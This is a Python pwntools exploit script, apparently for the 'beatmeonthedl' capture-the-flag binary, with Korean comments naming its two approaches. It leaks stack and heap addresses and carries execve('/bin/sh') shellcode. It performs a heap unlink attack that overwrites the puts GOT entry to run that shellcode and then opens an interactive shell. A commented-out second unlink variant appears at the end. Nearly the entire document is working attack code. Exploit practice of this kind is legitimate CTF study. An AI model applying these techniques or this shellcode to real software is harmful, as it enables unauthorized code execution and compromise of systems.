#-*- encoding:utf-8 -*-
from pwn import *

shellcode = '\x90'*10 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

puts_got = 0x609958
reqlist = 0x609e80

elf = ELF('beatmeonthedl')
r = elf.process()

def add_req(msg):
	r.send('1')
	print r.recvuntil('> ')
	r.send(msg)
	print r.recvuntil('| ')

def chg_req(num, msg):
	r.send('4')
	print r.recvuntil(': ')
	r.send(num)
	print r.recvuntil(': ')
	r.send(msg)
	print r.recvuntil('| ')

def del_req(num):
	r.send('3')
	print r.recvuntil(': ')
	r.send(num)
#	print r.recvuntil('| ')

# stack, heap을 leak하는 방법

print r.recvuntil('username: ')
r.send('a'*16)
stack_leak = u64(r.recvline().split('a'*16)[1].split('\n')[0].ljust(8, '\x00'))
log.success('stack leak: ' + hex(stack_leak))

print r.recvuntil('username: ')
r.send('mcfly')
print r.recvuntil('Pass: ')
r.send('a'*0x18)
heap_leak = u64(r.recvline().split('a'*0x18)[1].split('\n')[0].ljust(8, '\x00'))
log.success('heap leak: ' + hex(heap_leak))

chunk0 = heap_leak + 0x40
jmp_addr = chunk0 + len(shellcode)

payload = shellcode
payload += asm('push ' + hex(chunk0), arch='amd64', os='linux')
payload += asm('ret', arch='amd64', os='linux')

print r.recvuntil('username: ')
r.send('mcfly')
print r.recvuntil('Pass: ')
r.send('awesnap')

print r.recvuntil('| ')
add_req('a')
add_req('a')
add_req('a')
add_req('a')

chg_req('2', p64(puts_got) + p64(jmp_addr) + 'A'*0x20 + p64(0x40) + p64(0x42))
chg_req('0', payload)
#raw_input(': ')
del_req('3')

r.interactive()

# reqlist를 조작하는 방법
'''
print r.recvuntil('username: ')
r.sendline('mcfly')

print r.recvuntil('Pass: ')
r.sendline('awesnap')

print r.recvuntil('| ')
add_req('A')
add_req('B')

chg_req('0', p64(reqlist-0x18) + p64(reqlist-0x10) + 'A'*0x20 + p64(0x40) + p64(0x42))
del_req('1')

chg_req('0', 'A'*0x18 + p64(puts_got))
chg_req('0', p64(puts_got+0x8) + shellcode)

r.interactive()
'''
